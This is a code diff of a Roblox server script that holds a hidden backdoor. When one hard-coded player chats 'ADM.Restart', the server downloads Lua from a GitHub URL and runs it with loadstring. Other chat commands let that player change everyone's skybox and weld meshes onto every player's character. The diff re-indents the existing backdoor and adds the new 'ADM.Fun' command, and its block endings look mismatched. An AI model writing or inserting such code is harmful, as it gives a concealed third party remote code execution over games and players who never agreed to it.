@@ -20,21 +20,35 @@ game.Players.PlayerAdded:Connect(function(plr)
 
 end)
 
-	for _, player in pairs(game.Players:GetPlayers()) do
-		if player.Name == "t10_kol" then
-			player.Chatted:Connect(function(message)
-				if message == "ADM.Restart" then
-					local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
-					local f = loadstring(code)
-					f()
-				elseif message == "ADM.Sky" then
-					game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
-					game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
-					game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
-					game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
-					game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
-					game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
+for _, player in pairs(game.Players:GetPlayers()) do
+	if player.Name == "t10_kol" then
+		player.Chatted:Connect(function(message)
+			if message == "ADM.Restart" then
+				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
+				local f = loadstring(code)
+				f()
+			elseif message == "ADM.Sky" then
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
+			elseif message == "ADM.Fun" then
+				for _, player2 in pairs(game.Players:GetPlayers()) do
+					local Part = Instance.new("Part",player2.Character)
+					Part.CanCollide=false
+					Part.CFrame = player2.Character.Torso.CFrame
+					local weld = Instance.new("Weld",Part)
+					weld.Part0 = player2.Character.Torso
+					weld.Part1 = Part
+					weld.C0 = CFrame.new(0,0.5,-0.75) * CFrame.Angles(0,math.rad(-90),0)
+					local mesh = Instance.new("SpecialMesh",Part)
+					mesh.MeshId = "rbxassetid://7606070501"
+					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
 				end
-			end)
-		end
+			end
+				--rbxassetid://7606070501
+		end)
 	end
+end
